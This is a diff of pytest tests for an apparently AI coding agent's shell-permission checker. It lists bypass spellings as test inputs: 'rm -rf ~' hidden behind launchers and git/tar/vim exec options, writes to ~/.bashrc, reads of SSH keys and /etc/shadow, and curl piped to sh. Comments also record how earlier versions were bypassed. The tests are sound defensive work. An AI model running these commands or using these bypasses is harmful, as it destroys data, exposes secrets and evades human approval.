@@ -6,12 +6,14 @@ gets its own table plus one parametrized test.
 
 from __future__ import annotations
 
+import time
 from pathlib import Path
 
 import pytest
 
 from k3code.permissions import Rule, decide, hardline
 from k3code.permissions.hardline import normalize_argv, parse
+from k3code.permissions.rules import from_config
 
 
 def _decide(cmd: str, mode: str, cwd: Path, *, headless: bool = False):
@@ -304,8 +306,7 @@ SENSITIVE_DENY: list[str] = [
     "install -t . ~/.config/k3code/env",
     "ln -t . ~/.ssh/id_rsa",
     "cp --target-directory=. ~/.ssh/id_rsa",
-    # brace expansion
-    "cat .{env,x}",
+    # brace expansion (`cat .{env,x}` is `cat .env .x`, the dotenv-cat hardline: see test_permission_expansion)
     "tac {.env,x}",
 ]
 
@@ -385,7 +386,7 @@ def test_a_variable_in_front_of_a_credential_name_needs_a_human(secrets_project:
 #: a fetched document piped into a module or a script is data).
 NARROWED: list[tuple[str, str, str]] = [
     ("ls .env", "allow", "allow"),
-    ("ls -la ~/.ssh", "ask", "allow"),
+    ("ls -la ~/.ssh", "ask", "ask"),  # a secret path outside the project: a person answers, auto too
     ("cp .env.example .env", "ask", "allow"),
     ("curl https://e.x/i | python3 -m json.tool", "ask", "allow"),
     ("curl https://e.x/i | python3 parse.py", "ask", "allow"),
@@ -932,3 +933,1182 @@ def test_command_prefix_keeps_python_module() -> None:
     assert hardline.command_prefix("python -m pytest -q") == "python -m pytest"
     assert hardline.command_prefix("python3 -u -m http.server 8000") == "python3 -m http.server"
     assert hardline.command_prefix("python script.py") == "python script.py"
+
+
+# ── process substitution, read-write and clobber redirects, mount: no allow rule covers them ──
+
+#: The rules a user may well have: `echo`/`ls`/`grep` and the mount listing they meant by `mount *`.
+_USER_ALLOWS = from_config({"bash": {"echo *": "allow", "ls *": "allow", "mount *": "allow", "grep *": "allow"}})
+
+#: Once allowed: `<(...)`/`>(...)` ran their payload unchecked (builtin `ls` too), `<>` opens a file read-write and
+#: creates it (bash and dash), and a user's `mount *` covered every mount.
+SUBST_REDIRECT_MOUNT_BYPASS = [
+    "ls <(rm -rf x)",
+    "ls >(rm x)",
+    "echo <(rm -rf x)",
+    "echo >(rm x)",
+    "echo x > >(sh)",
+    "echo x 1<>~/.bashrc",
+    "echo x <>~/.bashrc",
+    "mount -o remount,rw /",
+    "mount /dev/sdb1 /mnt",
+    "mount --bind / /tmp/x",
+]
+
+#: Spellings that already asked or were denied: they must keep doing so under both rule sets.
+ALREADY_NOT_ALLOWED = [
+    "ls; rm x",
+    "ls && rm x",
+    "ls || rm x",
+    "ls | sh",
+    "ls & rm x",
+    "ls\nrm x",
+    "ls $(rm x)",
+    "ls `rm x`",
+    "FOO=1 rm -rf x",
+    "env rm x",
+    "eval 'rm x'",
+    "bash -c 'rm x'",
+    "( rm x )",
+    "{ rm x; }",
+    "cat <<EOF | sh\nrm x\nEOF",
+    *(f"echo x {op} {t}" for op in (">", ">>", "2>", "&>", ">|") for t in ("~/.bashrc", "$HOME/.bashrc")),
+]
+
+
+@pytest.mark.parametrize("rules", [None, _USER_ALLOWS], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "accept-edits"])
+@pytest.mark.parametrize("cmd", SUBST_REDIRECT_MOUNT_BYPASS + ALREADY_NOT_ALLOWED)
+def test_no_allow_rule_covers_a_hidden_command_or_write(tmp_path: Path, cmd: str, mode: str, rules: list) -> None:
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action in ("ask", "deny"), (cmd, mode, dec.action)
+
+
+_AUTO_WRITES = [
+    f"echo x {op}{sp}{t}"
+    for op in ("<>", "1<>", ">|", "2>|", ">")
+    for sp in ("", " ")
+    for t in ("~/.bashrc", "$HOME/.bashrc")
+] + [f"echo x2{op}~/.bashrc" for op in ("&>", "&>>", ">", ">|")]  # the word's digits are no fd: `&>` still writes
+
+
+@pytest.mark.parametrize("rules", [None, _USER_ALLOWS], ids=["builtin", "user"])
+@pytest.mark.parametrize("cmd", _AUTO_WRITES)
+def test_auto_mode_refuses_read_write_and_clobber_redirects_outside_the_roots(
+    tmp_path: Path, cmd: str, rules: list
+) -> None:
+    assert decide(mode="auto", tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules).action == "deny"
+
+
+@pytest.mark.parametrize("mode", ["default", "accept-edits", "auto"])
+@pytest.mark.parametrize("cmd", ["mount /dev/sdb1 /mnt", "mount -o remount,rw /", "mount -a", "umount /mnt"])
+def test_a_mount_needs_a_person_whatever_the_rules(tmp_path: Path, cmd: str, mode: str) -> None:
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=_USER_ALLOWS)
+    assert (dec.action, dec.needs_human) == ("ask", True), (cmd, mode)
+
+
+_MOUNT_ALLOW = from_config({"bash": {"mount *": "allow"}})
+_FINDMNT_ALLOW = from_config({"bash": {"findmnt *": "allow"}})
+
+#: A `-t` value or a findmnt argument the shell expands into a device, `-o remount` or `-F FILE`, and findmnt's
+#: `-F`/`--tab-file` under a user's `findmnt *`: once allowed.
+EXPANDED_MOUNT_ARGS = [
+    *(
+        (cmd, _MOUNT_ALLOW)
+        for cmd in (
+            "mount -t ext4${IFS}/dev/sdb1${IFS}/mnt",
+            "mount -t auto${IFS}-o${IFS}remount,rw${IFS}/",
+            "mount -t {ext4,/dev/sdb1,/mnt}",
+            "mount -t *",
+            "mount -t $X",
+        )
+    ),
+    *(
+        (cmd, rules)
+        for cmd in (
+            "findmnt -F x",
+            "findmnt --tab-file x",
+            "findmnt --tab-file=x",
+            "findmnt -Fx",
+            "findmnt -t x${IFS}-F${IFS}/etc/shadow",
+            "findmnt -t *",
+            "findmnt -t {a,-F,/etc/passwd}",
+        )
+        for rules in (None, _FINDMNT_ALLOW)
+    ),
+]
+
+
+@pytest.mark.parametrize("mode", ["default", "auto"])
+@pytest.mark.parametrize(("cmd", "rules"), EXPANDED_MOUNT_ARGS)
+def test_an_expanding_mount_type_or_findmnt_argument_needs_a_person(
+    tmp_path: Path, cmd: str, rules: list | None, mode: str
+) -> None:
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert (dec.action, dec.needs_human) == ("ask", True), (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("mode", ["default", "auto"])
+@pytest.mark.parametrize(
+    ("cmd", "rules"),
+    [
+        ("mount", _MOUNT_ALLOW),
+        ("mount -l", _MOUNT_ALLOW),
+        ("mount -t ext4", _MOUNT_ALLOW),
+        ("mount -l -t nfs4,ext4", _MOUNT_ALLOW),
+        ("findmnt", None),
+        ("findmnt -t ext4", None),
+        ("findmnt -t ext4", _FINDMNT_ALLOW),
+    ],
+)
+def test_mount_and_findmnt_listings_stay_allowed(tmp_path: Path, cmd: str, rules: list | None, mode: str) -> None:
+    assert decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules).action == "allow"
+
+
+@pytest.mark.parametrize(
+    ("cmd", "rules"),
+    [
+        ("ls", None),
+        ("grep foo file.txt", None),
+        ("findmnt", None),
+        ("findmnt -J -t ext4", None),
+        ("echo hi", _USER_ALLOWS),
+        ("mount", _USER_ALLOWS),
+        ("mount -l", _USER_ALLOWS),
+        ("mount -l -t ext4", _USER_ALLOWS),
+        ("echo x >|out.txt", _USER_ALLOWS),  # a clobber into the project, as `>out.txt`
+        ("echo x <>out.txt", _USER_ALLOWS),
+        # the user allowed diff; the builtin `ls` allows each payload in the project
+        ("diff <(ls a) <(ls b)", from_config({"bash": {"diff *": "allow"}})),
+    ],
+)
+def test_read_only_listings_and_allowed_payloads_stay_allowed(tmp_path: Path, cmd: str, rules: list | None) -> None:
+    assert decide(mode="default", tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules).action == "allow"
+
+
+@pytest.mark.parametrize(
+    ("cmd", "rules"),
+    [
+        ("diff <(ls a) <(ls b)", None),  # the builtin allowlist never covers a substitution
+        ("diff <(ls a) <(ls b)", _USER_ALLOWS),  # no rule allows diff with one
+        ("findmnt -F /etc/shadow", None),  # reads the file it names
+        ("echo $(echo $(echo $(echo $(echo $(echo hi)))))", _USER_ALLOWS),  # deeper than _NESTED_MAX_DEPTH
+        ("echo $(ls <(rm x))", _USER_ALLOWS),  # a payload inside a payload is checked too
+        # each nested command is allowed, but their output becomes the outer echo's words, which no rule saw
+        ("echo $(echo $(echo hi))", _USER_ALLOWS),
+    ],
+)
+def test_substitutions_nobody_vouches_for_ask(tmp_path: Path, cmd: str, rules: list | None) -> None:
+    assert decide(mode="default", tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules).action == "ask"
+
+
+def test_a_clobber_redirect_is_no_pipe() -> None:
+    assert parse("echo x >| ~/.bashrc").subs == ["echo x >| ~/.bashrc"]
+    assert parse("echo x \\>|sh").subs == ["echo x \\>", "sh"]  # a literal > piped to sh
+
+
+#: `|` after `&>`, `>>` or `<>` is no clobber: dash reads `echo x &>|f` as `echo x &` then `>|f` (truncate f, background
+#: echo), bash fails on the line. Once these were read as a clobber redirect, and `echo *` allowed them.
+_AMBIGUOUS_CLOBBER = [
+    "echo x &>|~/.bashrc",
+    "echo x &>|out.txt rm",
+    "echo x >>|~/.bashrc",
+    "echo x \\&>|~/.bashrc",
+    "echo x \\>>|~/.bashrc",
+    "echo x <>|out.txt",
+]
+
+_ECHO_ALLOW = from_config({"bash": {"echo *": "allow"}})
+
+
+@pytest.mark.parametrize("rules", [None, _ECHO_ALLOW], ids=["none", "echo"])
+@pytest.mark.parametrize("mode", ["default", "auto"])
+@pytest.mark.parametrize("cmd", _AMBIGUOUS_CLOBBER)
+def test_a_pipe_after_a_double_redirect_operator_asks(tmp_path: Path, cmd: str, mode: str, rules: list | None) -> None:
+    assert parse(cmd).unterminated, cmd
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "ask", (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("rules", [None, _ECHO_ALLOW], ids=["none", "echo"])
+@pytest.mark.parametrize("mode", ["default", "auto"])
+@pytest.mark.parametrize("cmd", ["curl x >|sh", "curl x > |sh", "curl x \\>|sh", "curl x &>|sh", "curl x >>|sh"])
+def test_pipe_to_shell_stays_denied_around_a_clobber(tmp_path: Path, cmd: str, mode: str, rules: list | None) -> None:
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert (dec.action, dec.hardline) == ("deny", "pipe-to-shell"), cmd
+
+
+@pytest.mark.parametrize(
+    ("cmd", "action"),
+    [
+        ("echo x >|.git/hooks/pre-commit", "ask"),
+        ("echo x >|../out.txt", "ask"),
+        ("echo x 2>|~/.bashrc", "ask"),
+        ("echo x >|out.txt", "allow"),  # a clobber inside the project is a write `echo *` with `>` also gets
+    ],
+)
+def test_a_lone_clobber_redirect_keeps_its_target_check(tmp_path: Path, cmd: str, action: str) -> None:
+    dec = decide(mode="default", tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=_ECHO_ALLOW)
+    assert dec.action == action, (cmd, dec.action)
+
+
+# ── operator characters inside quotes are data, not redirects or substitutions ──
+
+_QUOTED_OPERATORS = [
+    'grep -rn "List<>" src',
+    'rg "Vec<>" src',
+    'grep -n "=>(" src',
+    'grep -E "foo>|bar" a.txt',
+    'git log --grep="x=>(y)"',
+    "grep -n 'a<(b' src",
+]
+
+
+@pytest.mark.parametrize("cmd", _QUOTED_OPERATORS)
+def test_quoted_operator_characters_need_no_human(tmp_path: Path, cmd: str) -> None:
+    assert _decide(cmd, "default", tmp_path).action == "allow", cmd
+    assert _decide(cmd, "auto", tmp_path).action == "allow", cmd
+
+
+@pytest.mark.parametrize("cmd", ['echo "a<(b)"', "echo 'x > y'"])
+def test_quoted_operator_characters_stay_under_a_user_allow(tmp_path: Path, cmd: str) -> None:
+    rules = from_config({"bash": {"echo *": "allow"}})
+    for mode in ("default", "auto"):
+        assert decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules).action == "allow"
+
+
+#: (command, user allow rule or None, decisions in default / accept-edits / auto), as measured before the quote mask
+_QUOTED_CODE_KEEPS = [
+    ('echo "$(rm x)"', None, ("ask", "ask", "allow")),
+    ('grep "$(rm x)" f', None, ("ask", "ask", "allow")),
+    ('echo x >"$HOME/.bashrc"', None, ("ask", "ask", "deny")),
+    ('echo x > "/etc/passwd"', None, ("ask", "ask", "deny")),
+    ('echo "$(echo x > ~/.bashrc)"', None, ("ask", "ask", "deny")),
+    ("echo $'\\'' >(rm x) $'\\''", None, ("ask", "ask", "ask")),
+    ("echo x > '/etc/passwd'", None, ("ask", "ask", "deny")),
+    ("cat <(rm x)", None, ("ask", "ask", "allow")),
+    ("echo 'a' >(rm x)", None, ("ask", "ask", "allow")),
+    ("bash -c 'echo x > ~/.bashrc'", None, ("ask", "ask", "deny")),
+    ('eval "echo x > ~/.bashrc"', None, ("ask", "ask", "deny")),
+    ("awk '{print > \"/etc/x\"}' f", None, ("ask", "ask", "deny")),
+    ("find . -exec sh -c 'echo > /etc/x' \\;", None, ("ask", "ask", "deny")),
+    ('sh -c "cat < .env"', None, ("deny", "deny", "deny")),
+    ('echo "$(rm x)"', "echo *", ("ask", "ask", "allow")),
+    ('echo x >"$HOME/.bashrc"', "echo *", ("ask", "ask", "deny")),
+    ("echo 'a' >(rm x)", "echo *", ("ask", "ask", "allow")),
+    ("bash -c 'echo x > ~/.bashrc'", "bash *", ("ask", "ask", "deny")),
+    ('eval "echo x > ~/.bashrc"', "eval *", ("ask", "ask", "deny")),
+    ("awk '{print > \"/etc/x\"}' f", "awk *", ("ask", "ask", "deny")),
+    ("find . -exec sh -c 'echo > /etc/x' \\;", "find *", ("ask", "ask", "deny")),
+    ('sh -c "cat < .env"', "sh *", ("deny", "deny", "deny")),
+    ("sudo bash -c 'echo x > ~/.bashrc'", "sudo *", ("ask", "ask", "deny")),
+    ("ssh h 'echo x > ~/.bashrc'", "ssh *", ("ask", "ask", "deny")),
+    ("git -c core.pager='cat > /etc/x' log", "git *", ("ask", "ask", "deny")),
+]
+
+
+@pytest.mark.parametrize(("cmd", "rule", "expected"), _QUOTED_CODE_KEEPS)
+def test_quoted_code_and_real_targets_keep_their_decisions(
+    tmp_path: Path, cmd: str, rule: str | None, expected: tuple[str, str, str]
+) -> None:
+    (tmp_path / ".env").write_text("A=1\n")
+    rules = from_config({"bash": {rule: "allow"}}) if rule else None
+    got = tuple(
+        decide(mode=m, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules).action
+        for m in ("default", "accept-edits", "auto")
+    )
+    assert got == expected, cmd
+
+
+# ── auto mode: a redirect target is resolved from every directory the line can cd to ──
+
+#: a project outside the sandbox's /tmp, so `..` from it is not the scratch tmpfs
+_PROJ = "/proj"
+WRITES_OUTSIDE = [
+    "echo x > ../out.txt",
+    "echo x >> ../out.txt",
+    "echo x 2> ../out.txt",
+    "echo x >| ../out.txt",
+    "echo x <> ../out.txt",
+    "cd .. && echo x > out.txt",
+    "cd / && echo x > etc/out.txt",
+    "cd src && echo x > ../../out.txt",
+    "pushd .. && echo x > out.txt",
+    "cd $D && echo x > out.txt",  # a cd the check cannot resolve may be anywhere
+]
+
+
+@pytest.mark.parametrize("cmd", WRITES_OUTSIDE)
+def test_auto_mode_denies_a_relative_write_outside_the_project(cmd: str) -> None:
+    dec = decide(mode="auto", tool="bash", args={"command": cmd}, cwd=_PROJ)
+    assert dec.action == "deny" and "project roots" in (dec.message or ""), (cmd, dec.action, dec.message)
+
+
+@pytest.mark.parametrize("cmd", ["echo x > out.txt", "cd src && ls", "cd /tmp && echo hi > out.txt"])
+def test_auto_mode_keeps_writes_inside_the_project_and_the_sandbox_tmp(cmd: str) -> None:
+    dec = decide(mode="auto", tool="bash", args={"command": cmd}, cwd=_PROJ)
+    assert dec.action == "allow", (cmd, dec.message)
+
+
+def test_auto_mode_resolves_a_cd_through_a_symlink_before_its_dotdot(tmp_path: Path) -> None:
+    # `cd link && > ../x` writes next to the link's target, not next to the link
+    (tmp_path / "link").symlink_to("/usr/share")
+    dec = decide(mode="auto", tool="bash", args={"command": "cd link && echo x > ../x.txt"}, cwd=tmp_path)
+    assert dec.action == "deny" and "project roots" in (dec.message or ""), dec.message
+
+
+# ── the hardline looks through launchers that run their arguments: flock, script, tmux, screen, setpriv, ... ──
+LAUNCHER_HARDLINE_DENY: list[str] = [
+    "flock /tmp/l rm -rf /",
+    "flock /tmp/l rm -rf ~",
+    "flock -n /tmp/l rm -rf ~",
+    "flock -w 5 /tmp/l rm -rf ~",
+    "flock /tmp/l -c 'rm -rf ~'",
+    "flock /tmp/l -c env",
+    "flock /tmp/l env",
+    "script -qc 'rm -rf ~'",
+    "script -c 'rm -rf ~' /dev/null",
+    "script -q -c 'rm -rf ~' /dev/null",
+    "script --command 'rm -rf ~' /dev/null",
+    "script -c env /dev/null",
+    "tmux new 'rm -rf ~'",
+    "tmux new-session -d 'rm -rf ~'",
+    "tmux new-session -d -s x 'rm -rf ~'",
+    "tmux new-window 'rm -rf ~'",
+    "tmux split-window 'rm -rf ~'",
+    "tmux run-shell 'rm -rf ~'",
+    "tmux new -d rm -rf ~",
+    "screen -dm rm -rf ~",
+    "screen -dmS x rm -rf ~",
+    "screen -d -m -S x rm -rf ~",
+    "screen -dm bash -c 'rm -rf ~'",
+    "setpriv --reuid 1000 rm -rf ~",
+    "runuser -u x -- rm -rf ~",
+    "runuser -c 'rm -rf ~' x",
+    "sg grp -c 'rm -rf ~'",
+    "systemd-run --user rm -rf ~",
+    "systemd-run -p X=1 --user rm -rf ~",
+    "unshare -r rm -rf ~",
+    "nsenter -t 1 -m rm -rf ~",
+    "chroot / rm -rf ~",
+    "firejail rm -rf ~",
+    "firejail --noprofile rm -rf ~",
+    "bwrap --bind / / rm -rf ~",
+    "torsocks rm -rf ~",
+    "proxychains rm -rf ~",
+    "proxychains4 -q rm -rf ~",
+    "fakeroot rm -rf ~",
+    "rlwrap rm -rf ~",
+    "xvfb-run rm -rf ~",
+    "xvfb-run -a rm -rf ~",
+    "dbus-run-session rm -rf ~",
+    "dbus-run-session -- rm -rf ~",
+    "systemd-inhibit rm -rf ~",
+    "systemd-inhibit --why=x rm -rf ~",
+    "ltrace rm -rf ~",
+    "valgrind rm -rf ~",
+    "catchsegv rm -rf ~",
+    "gdb --args rm -rf ~",
+    "gdb -batch -ex run --args rm -rf ~",
+    "entr rm -rf ~",
+    "entr -r rm -rf ~",
+    "uv run rm -rf ~",
+    "uv run --with x rm -rf ~",
+    "npx rm -rf ~",
+]
+
+
+@pytest.mark.parametrize("cmd", LAUNCHER_HARDLINE_DENY)
+def test_hardline_sees_through_launchers(tmp_path: Path, cmd: str) -> None:
+    rule = from_config({"bash": {f"{cmd.split()[0]} *": "allow"}})
+    for mode, rules in (("default", None), ("auto", None), ("yolo", None), ("default", rule), ("auto", rule)):
+        d = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+        assert d.action == "deny", (cmd, mode, rules is not None)
+        assert d.hardline, (cmd, mode)
+
+
+#: what the forced-human check reads (``git reset --hard``) is read in the shell code of a launcher too
+LAUNCHER_NEEDS_HUMAN = [
+    "flock -c 'git reset --hard' /tmp/l",
+    "flock /tmp/l -c 'git reset --hard'",
+    "script -qc 'git reset --hard' /dev/null",
+    "tmux new 'git reset --hard'",
+]
+
+
+@pytest.mark.parametrize("cmd", LAUNCHER_NEEDS_HUMAN)
+def test_launcher_code_needs_a_human(tmp_path: Path, cmd: str) -> None:
+    rule = from_config({"bash": {f"{cmd.split()[0]} *": "allow"}})
+    for mode, rules in (("default", None), ("auto", None), ("default", rule), ("auto", rule)):
+        d = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+        assert (d.action, d.needs_human) == ("ask", True), (cmd, mode, rules is not None)
+
+
+#: a launcher running something harmless keeps its decision: ask by default, allowed in auto
+LAUNCHER_KEEP = [
+    "flock /tmp/l ls",
+    "script -qc 'ls' /dev/null",
+    "tmux new 'ls'",
+    "tmux ls",
+    "screen -dm sleep 1",
+    "screen -ls",
+    "uv run pytest",
+    "npx prettier --check .",
+]
+
+
+@pytest.mark.parametrize("cmd", LAUNCHER_KEEP)
+def test_harmless_launcher_commands_keep_their_decisions(tmp_path: Path, cmd: str) -> None:
+    assert _decide(cmd, "default", tmp_path).action == "ask", cmd
+    assert _decide(cmd, "auto", tmp_path).action == "allow", cmd
+    assert _decide(cmd, "yolo", tmp_path).action == "allow", cmd
+
+
+#: a delete behind a launcher no reading of it knows (an option spelling, a subcommand, a tmux chain, a quoted
+#: payload): the run scan reads `rm -rf ~` wherever it starts in the command line
+RUN_SCAN_DENIES = [
+    "flock --wa 5 L rm -rf ~",
+    "setpriv --reu 1000 rm -rf ~",
+    "script --comm 'rm -rf ~'",
+    "timeout --sig KILL 5 rm -rf ~",
+    "tmux split 'rm -rf ~'",
+    "tmux new-w 'rm -rf ~'",
+    "tmux run-s 'rm -rf ~'",
+    "tmux new -d \\; neww 'rm -rf ~'",
+    "screen -S n -X exec rm -rf ~",
+    "uv run -i https://x rm -rf ~",
+    "npx --registry https://x rm -rf ~",
+    "nsenter -W /x rm -rf ~",
+    "gdb -ex 'shell rm -rf ~' x",
+    "npm exec rm -rf ~",
+    "runuser x -- -c 'rm -rf ~'",
+    "x a 'b \"rm -rf ~\"'",
+]
+
+
+@pytest.mark.parametrize("cmd", RUN_SCAN_DENIES)
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize("ruled", [False, True])
+def test_delete_anywhere_in_the_command_line_is_refused(tmp_path: Path, cmd: str, mode: str, ruled: bool) -> None:
+    rules = from_config({"bash": {f"{cmd.split()[0]} *": "allow"}}) if ruled else None
+    d = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert d.action == "deny", (cmd, mode, ruled)
+
+
+#: text that only names a delete (a message, a pattern, an echo) and ast-grep's `sg` are not a delete
+RUN_SCAN_KEEP = [
+    "git commit -m 'rm -rf ~ is bad'",
+    "hg commit -m 'rm -rf ~ is bad'",
+    "echo rm -rf ~",
+    "grep -rn 'rm -rf' src",
+    "rg 'rm -rf ~' docs",
+    "sg -p 'rm -rf ~' src",
+    "sg run -p 'rm -rf ~' src",
+    "python3 -c 'print(1)'",
+    "bash -c 'ls'",
+    "make clean",
+    "flock -n /tmp/l make",
+    "tmux new -s dev",
+]
+
+
+@pytest.mark.parametrize("cmd", RUN_SCAN_KEEP)
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize("ruled", [False, True])
+def test_text_naming_a_delete_is_not_refused(tmp_path: Path, cmd: str, mode: str, ruled: bool) -> None:
+    rules = from_config({"bash": {f"{cmd.split()[0]} *": "allow"}}) if ruled else None
+    d = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert d.action != "deny", (cmd, mode, ruled)
+
+
+@pytest.mark.parametrize("cmd", ["sg wheel -c 'rm -rf ~'", "sg wheel 'rm -rf ~'", "sg - wheel -c 'rm -rf ~'"])
+def test_shadow_utils_sg_code_is_still_refused(tmp_path: Path, cmd: str) -> None:
+    assert _decide(cmd, "yolo", tmp_path).action == "deny", cmd
+
+
+# ── options whose value runs a command: git -c exec keys, rg --pre, man -P, text piped into a shell ──
+
+EXEC_OPTION_DENY: list[tuple[str, str]] = [
+    ("git", "git -c core.fsmonitor='rm -rf ~' status"),
+    ("git", "git -c core.sshCommand='rm -rf ~' fetch"),
+    ("git", "git -c core.pager='rm -rf ~' log"),
+    ("git", "git -c core.editor='rm -rf ~' commit"),
+    ("git", "git -c alias.x='!rm -rf ~' x"),
+    ("git", "git -c alias.p='push --force origin main' p"),
+    ("git", "git -c credential.helper='!rm -rf ~' fetch"),
+    ("git", "git -c diff.external='rm -rf ~' diff"),
+    ("git", "git -c diff.x.textconv='rm -rf ~' diff"),
+    ("git", "git --config-env=core.fsmonitor=VAR status"),
+    ("git", "git --config-env core.pager=VAR log"),
+    ("git", "git -c core.fsmonitor='rm -rf ~' commit -m x"),
+    ("rg", "rg --pre rm x ~"),
+    ("rg", "rg --pre=rm x ~"),
+    ("rg", "rg --pre-glob '*' --pre rm x"),
+    ("rg", "rg --hostname-bin=rm x"),
+    ("rg", "rg --pre sh x"),
+    ("man", "man -P 'rm -rf ~' ls"),
+    ("man", "man --pager='rm -rf ~' ls"),
+    ("man", "man --pager 'rm -rf ~' ls"),
+    ("man", "man -aP 'rm -rf ~' ls"),
+    ("man", "man --html='rm -rf ~' ls"),
+    ("sh", "echo 'rm -rf ~' | sh"),
+    ("bash", "printf 'rm -rf ~' | bash"),
+    ("sh", "echo 'rm -rf ~' | sh -s"),
+    # git -c behind any launcher or path that names git
+    ("sudo", "sudo -u git git -c core.pager='rm -rf ~' log"),
+    ("flock", "flock L git -c core.pager='rm -rf ~' log"),
+    ("env", "env X=1 git -c core.fsmonitor='rm -rf ~' status"),  # guard: already refused before
+    ("nice", "nice git -c core.sshCommand='rm -rf ~' fetch"),  # guard: already refused before
+    ("timeout", "timeout 5 git -c alias.x='!rm -rf ~' x"),  # guard: already refused before
+    ("/usr/bin/git", "/usr/bin/git -c core.pager='rm -rf ~' log"),  # guard: already refused before
+    ("command", "command git -c core.pager='rm -rf ~' log"),  # guard: already refused before
+    ("xargs", "xargs git -c core.pager='rm -rf ~' log"),  # guard: already refused before
+    # environment variables whose value a program runs as a command line
+    ("git", "GIT_SSH_COMMAND='rm -rf ~' git fetch"),
+    ("git", "GIT_EXTERNAL_DIFF='rm -rf ~' git diff"),
+    ("git", "GIT_PAGER='rm -rf ~' git log"),
+    ("git", "GIT_EDITOR='rm -rf ~' git commit"),
+    ("git", "GIT_ASKPASS='rm -rf ~' git fetch"),
+    ("man", "PAGER='rm -rf ~' man ls"),
+    ("man", "MANPAGER='rm -rf ~' man ls"),
+    ("crontab", "EDITOR='rm -rf ~' crontab -e"),
+    ("crontab", "VISUAL='rm -rf ~' crontab -e"),
+    ("git", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0='rm -rf ~' git log"),
+    ("bash", "PROMPT_COMMAND='rm -rf ~' bash"),
+    ("bash", "BASH_ENV='rm -rf ~' bash -c ls"),
+    ("env", "env GIT_PAGER='rm -rf ~' git log"),
+]
+
+
+@pytest.mark.parametrize(("prog", "cmd"), EXEC_OPTION_DENY)
+def test_option_values_that_run_commands_are_refused(tmp_path: Path, prog: str, cmd: str) -> None:
+    allow = [Rule(tool="bash", pattern=f"{prog} *", action="allow", layer=1)]
+    for mode in ("default", "auto", "yolo"):
+        for rules in ([], allow):
+            d = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+            assert d.action == "deny" and d.hardline, (cmd, mode, bool(rules))
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "git -c user.name=x -c user.email=y commit -m z",
+        "git -c color.ui=always log",
+        "git -c core.pager=cat log",
+        "git -c core.editor=true rebase",
+        "git -c core.fsmonitor=true status",
+        "git commit -m 'rm -rf ~ is bad'",
+        "rg -n x src",
+        "rg --pre cat x docs",
+        "rg --pre-glob '*.gz' x",
+        "man ls",
+        "man -P less ls",
+        "grep -rn 'rm -rf' src",
+        "echo rm -rf ~",
+        "echo 'rm -rf ~' | cat",
+        "sudo -u git git status",
+        "env X=1 git log",
+        "EDITOR=vim git commit",
+        "PAGER=less man ls",
+        "GIT_PAGER=cat git log",
+        "GIT_SSH_COMMAND='ssh -i ~/.ssh/k' git fetch",
+        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=cat git log",
+    ],
+)
+def test_benign_option_values_are_not_refused(tmp_path: Path, cmd: str) -> None:
+    assert hardline.check(cmd, cwd=str(tmp_path), home=str(tmp_path / "home")) is None, cmd
+
+
+# review 9: the run scan read only whole words, so a command handed over inside a word passed under a `prog *` rule
+# and in auto: a glued git config, a tar exec option, a vim/less `!CMD`, an env value, a git alias, an ext:: URL
+DERIVED_RUNS = [
+    ("git", "git -ccore.pager='rm -rf ~' log"),
+    ("git", "git -ccore.fsmonitor='rm -rf ~' status"),
+    ("git", "git -ccore.sshCommand='rm -rf ~' fetch"),
+    ("sudo", "sudo -u git git -ccore.pager='rm -rf ~' log"),
+    ("tar", "tar cf /dev/null src --checkpoint=1 --checkpoint-action=exec='rm -rf ~'"),
+    ("tar", "tar xf a.tar --to-command='rm -rf ~'"),
+    ("tar", "tar --use-compress-program='rm -rf ~' -cf x src"),
+    ("vim", "vim -c '!rm -rf ~' x"),
+    ("vim", "vim +'!rm -rf ~' x"),
+    ("vim", "vim -c 'silent !rm -rf ~' x"),
+    ("less", "less '+!rm -rf ~' x"),
+    ("less", "less '+!sh' x"),
+    ("git", "GIT_PROXY_COMMAND='rm -rf ~' git fetch"),
+    ("git", "GIT_CONFIG_PARAMETERS=\"'core.pager'='rm -rf ~'\" git log"),
+    ("git", "git config alias.x '!rm -rf ~'"),
+    ("git", "git config --global alias.x '!rm -rf ~'"),
+    ("git", "git -c protocol.ext.allow=always fetch 'ext::sh -c rm% -rf% ~'"),
+]
+DERIVED_RUNS_KEEP = [
+    "git -c user.name=x commit -m y",
+    "git -ccore.pager=cat log",
+    "tar czf out.tgz src",
+    "tar --checkpoint=1 --checkpoint-action=echo=hi -cf x src",
+    "vim -c 'set ft=c' x",
+    "vim +10 x",
+    "less +F log",
+    "GIT_PAGER=cat git log",
+    "LESSOPEN='| lesspipe %s' less x",
+    "git config user.name x",
+    "git config alias.co checkout",
